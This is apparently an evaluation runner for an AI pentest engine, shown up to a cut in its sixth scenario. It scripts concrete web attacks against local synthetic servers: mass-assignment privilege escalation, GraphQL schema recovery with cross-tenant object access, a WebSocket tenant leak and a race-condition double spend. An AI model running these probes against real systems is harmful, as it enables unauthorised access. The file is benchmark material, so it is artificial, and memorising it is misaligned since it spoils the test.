#!/usr/bin/env bun
/**
 * pi-nuwa v8.0 L4 真实有状态 12 场景综合评估演武场运行器（NuwaCoreEngine 端到端闭环 + 硬门禁评分卡）。
 *
 * 用法:
 *   env -u BUN_OPTIONS bun benchmarks/l4-arena/run-l4-eval.ts [--json] [--deterministic] [--scenario <id>] [--help]
 *
 * 硬门禁指标:
 *   - allPassed === true
 *   - passedScenarios === 12
 *   - recallRate === 1
 *   - falsePositiveRate === 0
 *   - vaultLeakCount === 0
 */
import { randomBytes } from "node:crypto";
import { existsSync, mkdtempSync, readFileSync, readdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { NuwaCoreEngine } from "../../core/mcp-server";
import { computeKeyJaccard, extractJsonTopKeys } from "../../omp/auth-diff";
import { calibrationLedgerPath, recordPrediction } from "../../omp/calibration";
import { recordToolExecution } from "../../omp/evidence";
import {
	analyzeCrossFileRgs,
	bridgeRgsToVerificationIntents,
	writeStandalonePovScript,
} from "../../omp/rgs-analyzer";
import { checkScopeAndRisk, defaultScopeForTarget, isHostInScope } from "../../omp/scope";
import { clearSessionVault, upsertSessionRole } from "../../omp/session-vault";
import { queryFactsByText, saveStateToSqlite, sqliteDbPath } from "../../omp/sqlite-store";
import { loadState, saveState, withLock } from "../../omp/storage";
import type { ScopePolicy } from "../../omp/types";
import {
	L4_SCENARIO_SPECS,
	L4_SYNTHETIC_SECRETS,
	computeInPageRequestSignature,
	computeRfc2104Hmac,
	decodeGrpcWebFrameResponse,
	encodeGrpcWebOrgRequest,
	generateRfc6238Totp,
	startL4ScenarioServer,
	type L4ScenarioId,
	type L4ScenarioServerHandle,
	type L4ScenarioSpec,
} from "./servers";

export interface L4ScenarioEvalResult {
	id: L4ScenarioId;
	index: number;
	name: string;
	category: string;
	passed: boolean;
	terminalStatus: string;
	turnsUsed: number;
	expectedFindings: number;
	truePositives: number;
	falseNegatives: number;
	falsePositives: number;
	vaultLeaks: number;
	durationMs: number;
	detail: string;
	error?: string;
}

export interface L4HardGates {
	recallGate: boolean;
	zeroFalsePositiveGate: boolean;
	zeroVaultLeakGate: boolean;
	standalonePovGate: boolean;
	scopeIsolationGate: boolean;
	allPassed: boolean;
}

export interface L4ScorecardMetrics {
	totalScenarios: number;
	passedScenarios: number;
	expectedTotalFindings: number;
	truePositiveCount: number;
	falseNegativeCount: number;
	falsePositiveCount: number;
	recallRate: number;
	falsePositiveRate: number;
	vaultLeakCount: number;
	standalonePovExitZero: boolean;
	outOfScopeLeakRequests: number;
	wallTimeMs: number;
}

export interface L4BenchmarkSummary {
	schema: 1;
	suite: "nuwa-l4-arena";
	deterministic: boolean;
	generatedAt: string;
	allPassed: boolean;
	passedScenarios: number;
	totalScenarios: number;
	recallRate: number;
	falsePositiveRate: number;
	vaultLeakCount: number;
	metrics: L4ScorecardMetrics;
	gates: L4HardGates;
	scenarios: L4ScenarioEvalResult[];
}

export interface RunL4BenchmarkOptions {
	scenario?: string;
	deterministic?: boolean;
}

const FIXED_L4_EVAL_TS = "2026-11-28T00:00:00.000Z";

interface L4EvalEnv {
	makeWorkspace: (prefix: string) => string;
	trackProjectId: (projectId: string) => void;
	recordPovExitZero: (ok: boolean) => void;
	recordOutOfScopeHits: (hits: number) => void;
}

function assertOk(cond: unknown, msg: string): void {
	if (!cond) throw new Error(msg);
}

function tickTurn(root: string, delta = 1): number {
	return withLock(root, () => {
		const st = loadState(root);
		if (!st) throw new Error("NuwaState 未初始化");
		st.runtime.turns = (st.runtime.turns ?? 0) + delta;
		st.runtime.totalTurns = Math.max(st.runtime.totalTurns ?? 0, st.runtime.turns);
		saveState(root, st);
		return st.runtime.turns;
	});
}

function computeNormalizedShannonEntropy(text: string): number {
	if (!text) return 0;
	const freq = new Map<number, number>();
	const buf = Buffer.from(text, "utf8");
	for (let i = 0; i < buf.length; i++) {
		const b = buf[i]!;
		freq.set(b, (freq.get(b) ?? 0) + 1);
	}
	let h = 0;
	for (const count of freq.values()) {
		const p = count / buf.length;
		h -= p * Math.log2(p);
	}
	return h / 8;
}

/** 执行候选提交 -> 独立复验员（nuwa-verifier）双盲复验确认完整状态机闭环。 */
async function commitAndConfirmL4Finding(opts: {
	engine: NuwaCoreEngine;
	root: string;
	intentId: string;
	title: string;
	detail: string;
	candidateCmd: string;
	candidateOutput: string;
	verifyCmd: string;
	verifyOutput: string;
}): Promise<string> {
	const { engine, root, intentId, title, detail, candidateCmd, candidateOutput, verifyCmd, verifyOutput } = opts;

	recordPrediction(root, {
		intentId,
		taskCategory: "exploit",
		modelId: "nuwa-l4-eval",
		predictedConfidence: 0.94,
		estimatedTokens: 1400,
		note: title,
	});
	const c1 = await engine.callTool("nuwa_claim", { id: intentId, worker: "fujiang" });
	assertOk(!c1.isError, `认领意图 ${intentId} 失败: ${c1.content[0]?.text ?? ""}`);

	recordToolExecution(root, { tool: "bash", command: candidateCmd, output: candidateOutput, agentName: "fujiang" });
	const cm1 = await engine.callTool("nuwa_commit", {
		id: intentId,
		kind: "vuln",
		title,
		detail,
		command: candidateCmd,
		output: candidateOutput,
	});
	assertOk(!cm1.isError, `候选提交失败: ${cm1.content[0]?.text ?? ""}`);
	tickTurn(root, 1);

	const verifyIntentId = cm1.details?.verifyIntent as string | undefined;
	if (!verifyIntentId) {
		return loadState(root)!.intents[intentId]?.to ?? "";
	}

	await Bun.sleep(2);
	const cv = await engine.callTool("nuwa_claim", { id: verifyIntentId, worker: "nuwa-verifier" });
	assertOk(!cv.isError, `认领复验意图 ${verifyIntentId} 失败`);

	recordToolExecution(root, { tool: "bash", command: verifyCmd, output: verifyOutput, agentName: "nuwa-verifier" });
	const cmv = await engine.callTool("nuwa_commit", {
		id: verifyIntentId,
		kind: "vuln",
		title: `[Verified] ${title}`,
		detail: `双盲复验确认: ${detail}`,
		command: verifyCmd,
		output: verifyOutput,
	});
	assertOk(!cmv.isError, `双盲复验提交失败: ${cmv.content[0]?.text ?? ""}`);
	tickTurn(root, 1);

	const stAfter = loadState(root)!;
	const origFactId = stAfter.intents[intentId]?.to ?? "";
	assertOk(origFactId && stAfter.facts[origFactId]?.verifyStage === "confirmed", `预期事实 ${origFactId} 已进入 confirmed 状态`);
	return origFactId;
}

/** 导出全部审计报告产物并执行 SARIF 确认计数与全盘凭据零明文泄露扫描。 */
async function finalizeAndAuditL4Scenario(opts: {
	engine: NuwaCoreEngine;
	root: string;
	spec: L4ScenarioSpec;
	secretsToAudit: readonly string[];
	detail: string;
}): Promise<Omit<L4ScenarioEvalResult, "id" | "index" | "name" | "category" | "durationMs">> {
	const { engine, root, spec, secretsToAudit, detail } = opts;
	const compRes = await engine.callTool("nuwa_complete", {});
	assertOk(compRes.details?.ok === true, `${spec.id} 正向完成收口失败: ${compRes.content[0]?.text ?? ""}`);

	const mdRes = await engine.callTool("nuwa_report", { write: true, format: "md", bundle: true });
	const jsonRes = await engine.callTool("nuwa_report", { write: true, format: "json" });
	const sarifRes = await engine.callTool("nuwa_report", { write: true, format: "sarif" });
	const tlRes = await engine.callTool("nuwa_report", { write: true, format: "timeline" });
	assertOk(!mdRes.isError && !jsonRes.isError && !sarifRes.isError && !tlRes.isError, "报告导出不应报错");

	const sarifPath = join(root, ".nuwa", "REPORT.sarif.json");
	const jsonPath = join(root, ".nuwa", "REPORT.json");
	const mdPath = join(root, ".nuwa", "REPORT.md");
	const tlPath = join(root, ".nuwa", "TIMELINE.md");
	const sarifRaw = readFileSync(sarifPath, "utf8");
	const sarifParsed = JSON.parse(sarifRaw) as { runs?: Array<{ results?: Array<{ properties?: { factId?: string } }> }> };

	const stSnap = loadState(root)!;
	const verifyReceiptFactIds = new Set<string>(
		Object.values(stSnap.intents)
			.filter((it) => it.key.startsWith("verify-vuln:") && Boolean(it.to))
			.map((it) => it.to!),
	);
	const primaryConfirmed = (sarifParsed.runs?.[0]?.results ?? []).filter((item) => {
		const fid = item.properties?.factId;
		return !fid || !verifyReceiptFactIds.has(fid);
	});
	const sarifCount = primaryConfirmed.length;

	const textsToScan: string[] = [
		mdRes.content[0]?.text ?? "",
		jsonRes.content[0]?.text ?? "",
		sarifRes.content[0]?.text ?? "",
		tlRes.content[0]?.text ?? "",
		readFileSync(mdPath, "utf8"),
		readFileSync(jsonPath, "utf8"),
		sarifRaw,
		readFileSync(tlPath, "utf8"),
	];

	const bundleDir = mdRes.details?.bundleDir as string | undefined;
	if (bundleDir && existsSync(bundleDir)) {
		for (const f of readdirSync(bundleDir)) {
			const fp = join(bundleDir, f);
			if (existsSync(fp)) textsToScan.push(readFileSync(fp, "utf8"));
		}
	}

	saveStateToSqlite(root, stSnap);
	assertOk(existsSync(sqliteDbPath(root)), "SQLite 权威库落盘检查");
	textsToScan.push(JSON.stringify(queryFactsByText(root, "http", { limit: 5 })));
	const calibFile = calibrationLedgerPath(root);
	if (existsSync(calibFile)) textsToScan.push(readFileSync(calibFile, "utf8"));

	let vaultLeaks = 0;
	for (const body of textsToScan) {
		for (const sec of secretsToAudit) {
			if (sec && sec.length >= 8 && body.includes(sec)) vaultLeaks++;
		}
	}

	clearSessionVault(root, stSnap.project.id);
	const truePositives = Math.min(spec.expectedFindings, sarifCount);
	const falseNegatives = Math.max(0, spec.expectedFindings - truePositives);
	const falsePositives = Math.max(0, sarifCount - spec.expectedFindings);

	return {
		passed:
			stSnap.project.status === "completed" &&
			truePositives === spec.expectedFindings &&
			falsePositives === 0 &&
			vaultLeaks === 0,
		terminalStatus: stSnap.project.status,
		turnsUsed: stSnap.runtime.turns,
		expectedFindings: spec.expectedFindings,
		truePositives,
		falseNegatives,
		falsePositives,
		vaultLeaks,
		detail,
	};
}

async function initScenarioEngine(
	env: L4EvalEnv,
	spec: L4ScenarioSpec,
	srv: L4ScenarioServerHandle,
	extraScope?: Partial<ScopePolicy>,
): Promise<{ root: string; engine: NuwaCoreEngine }> {
	const root = env.makeWorkspace(`nuwa-l4-${spec.id}-`);
	const engine = new NuwaCoreEngine({ projectRoot: root, cwd: root, sessionId: `l4-${spec.id}` });
	const initRes = await engine.callTool("nuwa_init", {
		target: srv.baseUrl,
		mode: "pentest",
		goal: spec.description,
		...(extraScope ? { scope: extraScope } : {}),
	});
	assertOk(!initRes.isError, `初始化 ${spec.id} 失败: ${initRes.content[0]?.text ?? ""}`);
	env.trackProjectId(loadState(root)!.project.id);
	tickTurn(root, 1);
	return { root, engine };
}

async function planSingleVulnIntent(engine: NuwaCoreEngine, title: string, targetKey: string): Promise<string> {
	const res = await engine.callTool("nuwa_plan", {
		phase: "vuln",
		intents: [{ title, targetKey, expectedKind: "vuln", surfaceDomain: "path" }],
	});
	const id = ((res.details?.added as string[] | undefined) ?? [])[0];
	assertOk(Boolean(id), `规划意图失败: ${title}`);
	return id!;
}

// ==================== WebSocket 单次订阅接收辅助（保证连接关闭） ====================

async function probeWebSocketCrossTenantChannel(
	wsEndpointUrl: string,
	token: string,
	subscribeChannel: string,
	triggerFn: () => Promise<void>,
	timeoutMs = 3000,
): Promise<{ ackReceived: boolean; leakedMessage: string }> {
	return new Promise((resolvePromise, rejectPromise) => {
		const ws = new WebSocket(`${wsEndpointUrl}?token=${encodeURIComponent(token)}`);
		let ackReceived = false;
		let settled = false;
		const timer = setTimeout(() => {
			if (settled) return;
			settled = true;
			try { ws.close(); } catch { /* ignore */ }
			rejectPromise(new Error(`WebSocket 订阅验证超时 (${timeoutMs}ms)`));
		}, timeoutMs);

		const finish = (err: Error | null, res?: { ackReceived: boolean; leakedMessage: string }) => {
			if (settled) return;
			settled = true;
			clearTimeout(timer);
			try { ws.close(); } catch { /* ignore */ }
			if (err) rejectPromise(err);
			else resolvePromise(res!);
		};

		ws.onopen = () => {
			ws.send(JSON.stringify({ action: "subscribe", channel: subscribeChannel }));
		};
		ws.onerror = () => finish(new Error("WebSocket 握手或传输异常"));
		ws.onmessage = async (ev: MessageEvent) => {
			const dataStr = String(ev.data ?? "");
			if (dataStr.includes('"subscribed_ack"')) {
				ackReceived = true;
				try {
					await triggerFn();
				} catch (e) {
					finish(e instanceof Error ? e : new Error(String(e)));
				}
				return;
			}
			if (dataStr.includes('"settlement_push"')) {
				finish(null, { ackReceived, leakedMessage: dataStr });
			}
		};
	});
}

// ==================== 同步屏障并发发射器（用于场景 5 TOCTOU 竞态实测） ====================

async function fireSynchronizedBarrierRequests(
	url: string,
	bearerToken: string,
	concurrency = 6,
): Promise<Array<{ status: number; body: string }>> {
	let readyCount = 0;
	let releaseBarrier!: () => void;
	const barrierPromise = new Promise<void>((resolveBarrier) => {
		releaseBarrier = resolveBarrier;
	});

	const tasks = Array.from({ length: concurrency }, async () => {
		readyCount++;
		if (readyCount === concurrency) {
			releaseBarrier();
		}
		await barrierPromise;
		const res = await fetch(url, {
			method: "POST",
			headers: { Authorization: `Bearer ${bearerToken}`, "Content-Type": "application/json" },
			body: '{"voucherCode":"L4-ANNUAL-100"}',
		});
		return { status: res.status, body: await res.text() };
	});

	return Promise.all(tasks);
}

// ==================== 12 场景真实评估执行器 ====================

type L4Evaluator = (
	spec: L4ScenarioSpec,
	srv: L4ScenarioServerHandle,
	env: L4EvalEnv,
) => Promise<Omit<L4ScenarioEvalResult, "id" | "index" | "name" | "category" | "durationMs">>;

const L4_EVALUATORS: Record<L4ScenarioId, L4Evaluator> = {
	"s01-second-order-store-read": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv);
		const tok = L4_SYNTHETIC_SECRETS.s01AuthorBearer;
		upsertSessionRole(root, { role: "author", bearer: tok });

		const runWriteReadCleanCycle = async (): Promise<string> => {
			let createdProfileId = "";
			try {
				const writeRes = await fetch(`${srv.baseUrl}/api/v1/profiles/preferences`, {
					method: "POST",
					headers: { Authorization: `Bearer ${tok}`, "Content-Type": "application/json" },
					body: JSON.stringify({ displayName: "AuditProbe", headerTemplate: "Title: {{sys.cluster_audit_marker}}" }),
				});
				const writeBody = await writeRes.text();
				assertOk(writeRes.status === 201 && !writeBody.includes("CLUSTER_AUDIT_MARKER"), "一阶写入应为无直接回显的盲 201");
				createdProfileId = (JSON.parse(writeBody) as { profileId: string }).profileId;

				const readRes = await fetch(`${srv.baseUrl}/api/v1/reports/preview?profileId=${encodeURIComponent(createdProfileId)}`, {
					headers: { Authorization: `Bearer ${tok}` },
				});
				const readBody = await readRes.text();
				assertOk(readRes.status === 200 && readBody.includes("CLUSTER_AUDIT_MARKER_L4_S01_CONFIRMED"), "二阶读取应触发关联上下文暴露");
				return readBody;
			} finally {
				if (createdProfileId) {
					const delRes = await fetch(`${srv.baseUrl}/api/v1/profiles/preferences/${createdProfileId}`, {
						method: "DELETE",
						headers: { Authorization: `Bearer ${tok}` },
					});
					assertOk(delRes.status === 200, "写后读状态链清理动作应成功执行");
				}
			}
		};

		const out1 = await runWriteReadCleanCycle();
		const out2 = await runWriteReadCleanCycle();
		const intentId = await planSingleVulnIntent(engine, "验证 /api/v1/profiles/preferences -> /api/v1/reports/preview 二阶存储渲染暴露", "/api/v1/reports/preview");
		await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "Second-Order Write-then-Read 存储型模板上下文越权暴露 /api/v1/reports/preview",
			detail: `携带凭据 ${tok} 在配置写入后二次预览触发 CLUSTER_AUDIT_MARKER_L4_S01_CONFIRMED 暴露`,
			candidateCmd: `curl -sS -H "Authorization: Bearer ${tok}" "${srv.baseUrl}/api/v1/reports/preview"`,
			candidateOutput: out1,
			verifyCmd: `curl -sS -H "Authorization: Bearer ${tok}" "${srv.baseUrl}/api/v1/reports/preview"`,
			verifyOutput: out2,
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec, secretsToAudit: [tok],
			detail: "Write(201盲回执)->Read(200二阶暴露)->DELETE清理与复验闭环通过",
		});
	},

	"s02-mass-assignment-priv-esc": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv);
		const tok = L4_SYNTHETIC_SECRETS.s02AliceBearer;
		upsertSessionRole(root, { role: "alice", bearer: tok });

		// 1. 基线验证：初始 viewer 角色访问组织审计导出被 403 拦截
		const baseAudit = await fetch(`${srv.baseUrl}/api/v1/org/audit-export`, { headers: { Authorization: `Bearer ${tok}` } });
		assertOk(baseAudit.status === 403, "基线普通角色访问 /api/v1/org/audit-export 应返回 403");

		// 2. 良性字段更新对照：仅修改 displayName 仍保持 403
		await fetch(`${srv.baseUrl}/api/v1/users/me/profile`, {
			method: "PATCH",
			headers: { Authorization: `Bearer ${tok}`, "Content-Type": "application/json" },
			body: JSON.stringify({ displayName: "Alice Baseline" }),
		});
		const afterBenign = await fetch(`${srv.baseUrl}/api/v1/org/audit-export`, { headers: { Authorization: `Bearer ${tok}` } });
		assertOk(afterBenign.status === 403, "良性 PATCH 后权限边界不应改变");

		const runMassAssignCycle = async (): Promise<string> => {
			try {
				const patchRes = await fetch(`${srv.baseUrl}/api/v1/users/me/profile`, {
					method: "PATCH",
					headers: { Authorization: `Bearer ${tok}`, "Content-Type": "application/json" },
					body: JSON.stringify({ displayName: "Alice", orgRole: "org_owner" }),
				});
				assertOk(patchRes.status === 200, "PATCH 批量字段绑定探测应返回 200");
				const elevated = await fetch(`${srv.baseUrl}/api/v1/org/audit-export`, { headers: { Authorization: `Bearer ${tok}` } });
				const body = await elevated.text();
				assertOk(elevated.status === 200 && body.includes("org-audit-2026-l4-s02"), "写后读验证应成功提权读取组织审计导出");
				return body;
			} finally {
				// 补偿回滚恢复初始角色状态
				await fetch(`${srv.baseUrl}/api/v1/users/me/profile`, {
					method: "PATCH",
					headers: { Authorization: `Bearer ${tok}`, "Content-Type": "application/json" },
					body: JSON.stringify({ orgRole: "viewer", exportPrivilege: false }),
				});
			}
		};

		const out1 = await runMassAssignCycle();
		const out2 = await runMassAssignCycle();
		const intentId = await planSingleVulnIntent(engine, "验证 PATCH /api/v1/users/me/profile Mass Assignment 绑定 orgRole 垂直提权", "/api/v1/users/me/profile");
		await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "Mass Assignment 批量字段绑定垂直权限提升 PATCH /api/v1/users/me/profile",
			detail: `普通用户凭据 ${tok} 通过 PATCH 注入 orgRole=org_owner 成功打穿 /api/v1/org/audit-export (403 -> 200)`,
			candidateCmd: `curl -sS -X PATCH -H "Authorization: Bearer ${tok}" ${srv.baseUrl}/api/v1/users/me/profile -d '{"orgRole":"org_owner"}'`,
			candidateOutput: out1,
			verifyCmd: `curl -sS -X PATCH -H "Authorization: Bearer ${tok}" ${srv.baseUrl}/api/v1/users/me/profile -d '{"orgRole":"org_owner"}'`,
			verifyOutput: out2,
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec, secretsToAudit: [tok],
			detail: "基线403 -> PATCH绑定orgRole -> 审计导出200 -> 补偿回滚与复验通过",
		});
	},

	"s03-graphql-blind-schema-bola": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv);
		const aliceTok = L4_SYNTHETIC_SECRETS.s03AliceBearer;
		const bobTok = L4_SYNTHETIC_SECRETS.s03BobBearer;
		upsertSessionRole(root, { role: "alice", bearer: aliceTok });
		upsertSessionRole(root, { role: "bob", bearer: bobTok });

		const gqlPost = async (query: string, token = bobTok) => {
			const r = await fetch(`${srv.baseUrl}/graphql`, {
				method: "POST",
				headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
				body: JSON.stringify({ query }),
			});
			return { status: r.status, text: await r.text() };
		};

		// 1. 确认 __schema 内省已被严格禁用
		const introRes = await gqlPost("{ __schema { queryType { name } } }");
		assertOk(introRes.status === 400 && introRes.text.includes("introspection is disabled"), "内省必须处于禁用状态");

		// 2. 通过探测词触发 Did you mean 字段建议，盲还原根查询字段与嵌套子字段
		const rootProbe = await gqlPost("{ tenant }");
		const rootErrMsg = ((JSON.parse(rootProbe.text) as { errors?: Array<{ message?: string }> }).errors?.[0]?.message) ?? "";
		const reconstructedRoot = /Did you mean "([A-Za-z0-9_]+)"/.exec(rootErrMsg)?.[1] ?? "";
		assertOk(reconstructedRoot === "tenantWorkspace", `期望从建议盲还原出 tenantWorkspace，实际: ${rootProbe.text}`);

		const subProbe = await gqlPost(`{ ${reconstructedRoot}(id: "ws-bob") { id apiKey } }`);
		const subErrMsg = ((JSON.parse(subProbe.text) as { errors?: Array<{ message?: string }> }).errors?.[0]?.message) ?? "";
		const subSuggestions = [...(subErrMsg.split("Did you mean")[1] ?? "").matchAll(/"([A-Za-z0-9_]+)"/g)].map((m) => m[1]!);
		const reconstructedSub = subSuggestions.find((f) => f.toLowerCase().includes("apikey")) ?? "";
		assertOk(reconstructedSub === "apiKeyMetadata", `期望从建议盲还原出 apiKeyMetadata，实际: ${subProbe.text}`);

		// 3. 使用还原出的嵌套查询，以 bob 身份越权读取 ws-alpha 嵌套对象
		const exploitQuery = `{ ${reconstructedRoot}(id: "ws-alpha") { id ownerTenant planName ${reconstructedSub} { keyId maskedKey scopeTier } } }`;
		const hit1 = await gqlPost(exploitQuery, bobTok);
		const hit2 = await gqlPost(exploitQuery, bobTok);
		assertOk(hit1.status === 200 && hit1.text.includes("root-billing-admin"), "应成功检出跨租户 GraphQL 嵌套 BOLA");

		const intentId = await planSingleVulnIntent(engine, "验证 /graphql 盲还原 tenantWorkspace 跨租户嵌套对象 BOLA", "/graphql");
		await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "GraphQL 禁内省盲还原与跨租户嵌套对象 BOLA /graphql#tenantWorkspace",
			detail: `内省禁用下盲还原出 ${reconstructedRoot}.${reconstructedSub}，使用低权限凭据 ${bobTok}（对照 ${aliceTok}）读取 ws-alpha 密钥元数据`,
			candidateCmd: `curl -sS -X POST -H "Authorization: Bearer ${bobTok}" ${srv.baseUrl}/graphql -d '{"query":"${exploitQuery}"}'`,
			candidateOutput: hit1.text,
			verifyCmd: `curl -sS -X POST -H "Authorization: Bearer ${bobTok}" ${srv.baseUrl}/graphql -d '{"query":"${exploitQuery}"}'`,
			verifyOutput: hit2.text,
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec, secretsToAudit: [aliceTok, bobTok],
			detail: `内省400阻断 -> 盲还原(${reconstructedRoot}.${reconstructedSub}) -> 嵌套BOLA确认`,
		});
	},

	"s04-websocket-tenant-leak": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv);
		const wsTok = L4_SYNTHETIC_SECRETS.s04BobWsToken;
		upsertSessionRole(root, { role: "bob_ws", bearer: wsTok });
		assertOk(Boolean(srv.wsUrl), "场景 4 必须暴露本机 wsUrl");

		const triggerAlphaSettlement = async () => {
			const r = await fetch(`${srv.baseUrl}/api/v1/events/trigger-settlement`, {
				method: "POST",
				headers: { "Content-Type": "application/json" },
				body: JSON.stringify({ targetTenant: "tenant-alpha" }),
			});
			assertOk(r.status === 200, "触发结算推送应返回 200");
		};

		const wsHit1 = await probeWebSocketCrossTenantChannel(
			srv.wsUrl!,
			wsTok,
			"tenant:tenant-alpha:settlements",
			triggerAlphaSettlement,
		);
		assertOk(wsHit1.ackReceived && wsHit1.leakedMessage.includes("STL-ALPHA-2026-L4S04"), "bob WebSocket 应越权收到 tenant-alpha 实时推送");

		const wsHit2 = await probeWebSocketCrossTenantChannel(
			srv.wsUrl!,
			wsTok,
			"tenant:tenant-alpha:settlements",
			triggerAlphaSettlement,
		);

		const intentId = await planSingleVulnIntent(engine, "验证 /ws/events WebSocket 跨租户订阅推送隔离边界", "/ws/events");
		await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "WebSocket BOLA 订阅频道未校验租户归属导致实时结算推送越权 /ws/events",
			detail: `tenant-bob 携带 ${wsTok} 订阅 tenant:tenant-alpha:settlements 成功接收异租户实时帧`,
			candidateCmd: `ws-probe ${srv.wsUrl} channel=tenant:tenant-alpha:settlements`,
			candidateOutput: wsHit1.leakedMessage,
			verifyCmd: `ws-probe ${srv.wsUrl} channel=tenant:tenant-alpha:settlements`,
			verifyOutput: wsHit2.leakedMessage,
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec, secretsToAudit: [wsTok],
			detail: "WebSocket真实握手升级 -> 跨租户频道订阅 -> 实时帧捕获与连接释放通过",
		});
	},

	"s05-barrier-race-toctou": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv);
		const tok = L4_SYNTHETIC_SECRETS.s05MemberBearer;
		upsertSessionRole(root, { role: "member", bearer: tok });

		// 1. 负向零误报验证：对互斥锁保护的 /api/v1/vouchers/redeem-locked 发起 6 路同步屏障并发齐射，必须严格仅 1 次成功
		const lockedBurst = await fireSynchronizedBarrierRequests(`${srv.baseUrl}/api/v1/vouchers/redeem-locked`, tok, 6);
		const lockedSuccesses = lockedBurst.filter((r) => r.status === 200);
		assertOk(lockedSuccesses.length === 1, `加锁端点在并发下必须仅成功 1 次（防误报验证），实际=${lockedSuccesses.length}`);

		// 2. 正向同步屏障并发齐射测试非原子端点 /api/v1/vouchers/redeem
		const burst1 = await fireSynchronizedBarrierRequests(`${srv.baseUrl}/api/v1/vouchers/redeem`, tok, 6);
		const wins1 = burst1.filter((r) => r.status === 200);
		assertOk(wins1.length >= 2, `同步屏障并发齐射应突破 TOCTOU 产生 >=2 张兑换单，实际=${wins1.length}`);

		// 重置额度供独立复验员二次验证
		await fetch(`${srv.baseUrl}/api/v1/vouchers/reset`, {
			method: "POST",
			headers: { Authorization: `Bearer ${tok}` },
		});
		const burst2 = await fireSynchronizedBarrierRequests(`${srv.baseUrl}/api/v1/vouchers/redeem`, tok, 6);
		const wins2 = burst2.filter((r) => r.status === 200);
		assertOk(wins2.length >= 2, `独立复验并发齐射应再次复现 >=2 次成功兑换，实际=${wins2.length}`);

		const intentId = await planSingleVulnIntent(engine, "验证 POST /api/v1/vouchers/redeem 并发时序竞争双花缺陷", "/api/v1/vouchers/redeem");
		await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "TOCTOU 并发时序竞争突破单次兑换额度限制 POST /api/v1/vouchers/redeem",
			detail: `同步屏障 6 并发齐射（凭据 ${tok}）单笔余额成功签发 ${wins1.length} 张兑换凭证（对照加锁端点仅 1 次）`,
			candidateCmd: `barrier-race -n 6 ${srv.baseUrl}/api/v1/vouchers/redeem`,
			candidateOutput: JSON.stringify(wins1.map((w) => JSON.parse(w.body))),
			verifyCmd: `barrier-race -n 6 ${srv.baseUrl}/api/v1/vouchers/redeem`,
			verifyOutput: JSON.stringify(wins2.map((w) => JSON.parse(w.body))),
		});

		return finalizeAndAuditL4Scenario({
			engine, root, spec, secretsToAudit: [tok],
			detail: `加锁对照成功=1/6(0误报), 竞态端点屏障齐射成功=${wins1.length}/6与${wins2.length}/6`,
		});
	},

	"s06-short-jwt-401-reauth": async (spec, srv, env) => {
		const { root, engine } = await initScenarioEngine(env, spec, srv);
		const expiredTok = L4_SYNTHETIC_SECRETS.s06ExpiredJwt;
		const password = L4_SYNTHETIC_SECRETS.s06Password;
		const totpSeed = L4_SYNTHETIC_SECRETS.s06TotpSeedHex;
		upsertSessionRole(root, { role: "member", bearer: expiredTok, username: "s06_member", password });

		// 1. 携带短期过期 JWT 访问业务接口，验证触发 401 token_expired
		const firstTry = await fetch(`${srv.baseUrl}/api/v1/ledger/statements/2026-q4`, {
			headers: { Authorization: `Bearer ${expiredTok}` },
		});
		assertOk(firstTry.status === 401, "过期 JWT 应触发 HTTP 401");

		// 2. 执行交互式表单 + RFC 6238 TOTP 登录剧本获取新鲜 JWT 并热更新至 SessionVault
		const loginPage = await fetch(`${srv.baseUrl}/auth/login`);
		const setCookie = loginPage.headers.get("set-cookie") ?? "";
		const loginCookie = setCookie.split(";")[0] ?? "";
		const html = await loginPage.text();
		const csrf = /name="_csrf"\s+value="([^"]+)"/.exec(html)?.[1] ?? "";
		assertOk(Boolean(loginCookie && csrf), "登录页应签发会话 Cookie 与 CSRF 令牌");

		const step1 = await fetch(`${srv.baseUrl}/auth/login/step1`, {
			method: "POST",
			headers: { Cookie: loginCookie, "Content-Type": "application/json" },
			body: JSON.stringify({ username: "s06_member", password, csrf }),
		});
		assertOk(step1.status === 200, "交互式登录第一步密码校验应通过");

		const totpCode = generateRfc6238Totp(totpSeed);
		const step2 = await fetch(`${srv.baseUrl}/auth/login/totp`, {
			method: "POST",
			headers: { Cookie: loginCookie, "Content-Type": "application/json" },
			body: JSON.stringify({ totpCode }),
		});
		const step2Json = (await step2.json()) as { accessToken?: string };
		assertOk(step2.status === 200 && Boolean(step2Json.accessToken), "RFC 6238 TOTP 校验应签发新鲜 JWT");
		const freshTok = step2Json.accessToken!;
		upsertSessionRole(root, { role: "member", bearer: freshTok });

		// 3. 使用续期后的新鲜会话继续探测，实锤跨角色财务报表 BOLA
		const hit1 = await (await fetch(`${srv.baseUrl}/api/v1/ledger/statements/2026-q4`, { headers: { Authorization: `Bearer ${freshTok}` } })).text();
		const hit2 = await (await fetch(`${srv.baseUrl}/api/v1/ledger/statements/2026-q4`, { headers: { Authorization: `Bearer ${freshTok}` } })).text();
		assertOk(hit1.includes("L4_S06_REAUTH_BOLA_CONFIRMED"), "会话热续期后应成功检出财务账单 BOLA");

		const intentId = await planSingleVulnIntent(engine, "验证 401 交互式 TOTP 续期后 /api/v1/ledger/statements/2026-q4 水平越权", "/api/v1/ledger/statements/2026-q4");
		await commitAndConfirmL4Finding({
			engine, root, intentId,
			title: "BOLA 会话过期触发交互式 TOTP 续期后跨角色读取财务账单 /api/v1/ledger/statements/2026-q4",
			detail: `初始令牌 ${expiredTok} 返回 401 后，通过交互式 TOTP 登录续期为 ${freshTok} 并越权读取 cfo_office 报表`,
			candidateCmd: `curl -sS -H "Authorization: Bearer ${freshTok}" ${srv.baseUrl}/api/v1/ledger/statements/2026-q4`,
			candidateOutput: hit1,
